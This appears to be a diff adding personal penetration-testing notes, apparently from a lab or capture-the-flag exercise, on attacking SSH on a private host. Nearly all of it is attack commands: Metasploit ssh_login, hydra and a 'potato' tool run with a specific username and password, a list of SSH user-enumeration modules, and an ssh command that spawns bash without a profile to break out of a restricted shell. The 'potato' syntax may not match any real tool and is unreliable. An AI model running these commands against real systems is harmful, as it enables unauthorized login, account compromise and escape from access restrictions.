@@ -1,0 +1,18 @@
+Perform credential stuffing attack ( msf hydera potato mendoza - ChatGPT )
+    msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.40.209; set USERNAME tpv_user; set PASSWORD Spring4ever.; run; exit -y"
+    hydra -l tpv_user -p Spring4ever. ssh://192.168.40.209
+    potato --target 192.168.40.209 --user tpv_user --pass Spring4ever. --ssh
+
+
+SSH Enumeration - Tools
+    Metasploit-framework
+        1. modules/auxiliary/scanner/ssh/ssh_enumusers - 
+        2. modules/auxiliary/scanner/ssh/ssh_login - 
+
+
+
+    Shell Breakout
+        ssh tpv_user@192.168.40.209 -t "bash --noprofile"
+
+
+
